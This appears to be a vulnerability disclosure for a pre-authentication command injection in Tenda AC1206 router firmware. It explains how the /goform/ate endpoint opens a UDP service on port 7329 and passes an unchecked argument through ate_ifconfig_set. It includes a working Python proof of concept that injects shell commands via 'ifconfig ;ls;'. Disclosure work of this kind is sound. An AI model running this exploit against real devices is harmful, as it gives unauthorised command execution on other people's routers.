# Description

Tenda AC1206 ate_ifconfig_set has pre-authentication command injection

[firmware download](https://static.tenda.com.cn/tdcweb/download/uploadfile/AC1206/US_AC1206V1.0RTL_V15.03.06.23_multi_TD01.zip)

# Affected version

V15.03.06.23 and earlier 

# details

When accessing `url:/goform/ate`, `TendaAte` will be called

![2024-10-04_173619](.\2024-10-04_173619.png)

The `TendaAte` function creates a thread and calls `ate_main_handle`

![2024-10-04_173913](.\2024-10-04_173913.png)

In `ate_main_handle`, port number `7329` is opened, `udp` messages are received and processed, and the transmission message format is `command args`

The message is further processed by `ate_cmd_process`

When `command` is `ifconfig`, the `ate_ifconfig_set` function is entered, in which the `arg` passed in by the user is not checked, and a command injection exists

![2024-10-04_173320](.\2024-10-04_173320.png)

# POC

```py
import socket
import os

os.system('curl http://192.168.0.10/goform/ate')

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

server_address = ('192.168.0.10', 7329)
command = b'ls'
message = b'ifconfig ;' + command + b';'

try:
    print(f'Sending: {message}')
    sock.sendto(message, server_address)

    data, server = sock.recvfrom(4096)
    print(f'Received: {data}')

finally:

    sock.close()
```

![2024-10-04_184329](.\2024-10-04_184329.png)